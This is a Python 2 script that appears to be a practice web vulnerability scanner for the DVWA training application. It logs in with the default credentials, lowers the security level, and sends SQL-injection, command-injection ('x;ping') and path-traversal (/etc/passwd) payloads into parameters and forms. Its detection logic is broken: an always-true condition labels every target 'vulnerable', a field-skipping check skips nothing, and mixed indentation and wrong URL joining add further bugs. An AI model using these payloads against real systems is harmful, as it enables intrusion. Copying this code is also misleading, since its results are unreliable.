import urllib2, urlparse, re, optparse, sys
import urllib
from bs4 import BeautifulSoup
from cookielib import CookieJar
import cookielib

payload= ["'","x;ping -c 127.0.0.1","../../../../../../etc/passwd"]


def xtr_a(url):
        connection = urllib2.urlopen(url)
	soup = BeautifulSoup(connection, "lxml")
	a = soup.find_all('a')
	link = []
	for item in a:
		link.append(url+item.get('href'))
	return link

def xtr_form(url):
        connection = opener.open(url)
        soup = BeautifulSoup(connection, "lxml")
        a = soup.find_all('form')
        return a


def xtr_param(url):
        parsed = urlparse.urlparse(url)
        params = urlparse.parse_qsl(parsed.query)
	return params


def scan(url):
	params = xtr_param(url)
	forms = xtr_form(url)
	hrefs = xtr_a(url)
	parsed = urlparse.urlparse(url)
	target = []
	if len(params) != 0:
		print "We have url parameters to be injected"
		for k,v in params:
		    for item in payload:
			if k != 'Submit':
				target.append(parsed.scheme+"://"+parsed.netloc+parsed.path+"?"+k+"="+item+"&Submit=Submit")
			else:
				target.append(parsed.scheme+"://"+parsed.netloc+parsed.path+"?"+k+"="+item)
		for elem in target:
			print "Trying target:" + elem
			res = opener.open(elem)
			output = res.read()
			print output
			if 'error' or 'ERROR' or 'root' or 'PING' or 'bytes' or '/bin' in output:
				print "vulnerable", elem
	target_get = []
	target_post = []
	if len(forms) != 0:
		for form in forms:
			if form.get('method') == 'GET':
				print "We have <form method=GET"
				inputs = form.find_all("input")
				for input in inputs:
					if input.get('name') != "submit" or input.get('name') != "Submit":
						for item in payload:
							target_get.append(parsed.scheme+"://"+parsed.netloc+parsed.path+"?"+input.get('name')+"="+item+"?Submit=Submit")
				for item in target_get:
					res = opener.open(item)
					output = res.read()
					if ('error' or 'ERROR' or 'root' or 'PING' or 'bytes') in output:
                                		print "vulnerable", item
			else:
				print "We have <form method=POST"
				inputs = form.find_all("input")
				for input in inputs:
					if input.get('name') != "submit"  or input.get('name') != 'Submit':
						for item in payload:
							target_post.append({input.get('name') : item, "Submit": "submit"})
				for item in target_post:
					encoded = urllib.urlencode(item)
					resp = opener.open(url, encoded)
					output = resp.read()
					if ('error' or 'ERROR' or 'root' or 'PING' or 'bytes') in output:
                                                print "vulnerable", item

	if len(hrefs) != 0:
		print "We have hrefs"
		for item in hrefs:
			print item			
def dvwa_auth(url):
	global cj
	global opener
	cj = CookieJar()
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
	urllib2.install_opener(opener)
	form = {"username" : "admin", "password": "password","Login":"login"}
	data_encoded= urllib.urlencode(form)
        parsed = urlparse.urlparse(url)
	cookie = cookielib.Cookie(version=0, name='security', value='low',port=None, port_specified=False, domain='', domain_specified=False, domain_initial_dot=False, path='/', path_specified=True, secure=False, expires=None, discard=True, comment=None, comment_url=None, rest={'HttpOnly': None}, rfc2109=False)
	cj.set_cookie(cookie)
	resp = opener.open("http://"+parsed.netloc+"/login.php", data_encoded)
	content = resp.read()

if __name__ == "__main__":
    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="url", help="Target ex. \"http://www.example.com/page.php?id=1\")")
    parser.add_option("--dmwa", action="store_true", default="False", help="Set it to \'True\' if the target is DVWA for autologin")
    (option, args) = parser.parse_args()
    if len(sys.argv[1:]) == 0:
	print "no arg given!"
	parser.print_help()
    else:
	auth = dvwa_auth(option.url)
	result = scan(option.url)

